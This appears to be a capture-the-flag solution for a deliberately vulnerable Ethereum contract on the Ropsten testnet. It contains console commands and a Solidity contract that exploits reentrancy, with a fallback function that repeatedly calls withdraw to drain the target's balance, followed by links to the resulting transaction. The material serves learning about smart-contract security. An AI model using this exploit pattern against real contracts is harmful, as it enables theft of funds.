Initial donation:
```javascript
await contract.donate.sendTransaction(
    "0x6eE701bFA154aDDDeaD9fB6daF4D9a47b58182C2", 
    {
        from: player, 
        to: instance, 
        value: toWei(0.5)
    }
)
```

Exploiting contract:
```solidity
pragma solidity ^0.4.18;

interface Reentrance {
    function withdraw(uint _amount) external;
}

contract Exploit {
    function() public payable {
        address instance = 0x3f5386Fa3FBF9aD8CFD9E8a3253De9C2Ce674c1F;
        Reentrance r = Reentrance(instance);
        if (address(instance).balance > 0) {
            r.withdraw(0.5 ether);
        }
    }
}
```

Kick off the attack. We need to provide more gas than usual as this transaction requires more processing:
```javascript
await sendTransaction({from: player, to: "0x6eE701bFA154aDDDeaD9fB6daF4D9a47b58182C2", gas: 3000000})
```

Transaction: https://ropsten.etherscan.io/tx/0x775511ddba99622fc059a470e401c90ce6a3e429570f69d8157c230da7d33d5b
Contract: https://ropsten.etherscan.io/address/0x6ee701bfa154adddead9fb6daf4d9a47b58182c2